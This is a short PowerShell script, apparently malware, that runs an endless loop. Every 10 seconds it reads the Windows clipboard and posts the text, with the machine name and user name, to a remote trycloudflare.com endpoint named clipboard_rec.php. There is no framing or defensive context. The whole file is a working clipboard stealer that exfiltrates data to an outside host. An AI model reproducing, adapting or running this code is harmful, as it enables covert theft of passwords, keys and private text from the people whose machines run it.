Add-Type -AssemblyName System.Windows.Forms

$proto = "https"
$cl = ""
$ip = "movers-exp-calculations-closure.trycloudflare.com"
$port = ""
$url = "${proto}://${ip}${cl}${port}/clipboard_rec.php"

while ($true) {
    $clipText = [System.Windows.Forms.Clipboard]::GetText()

    if ($clipText) {
        $postParams = @{
            clipboard_data = $clipText
            machine_name = $env:COMPUTERNAME
            user_name = $env:USERNAME
        }

        try {
            Invoke-RestMethod -Uri $url -Method Post -Body $postParams
        } catch {
            Write-Host "Failed to send data: $_"
        }
    }

    Start-Sleep -Seconds 10
}
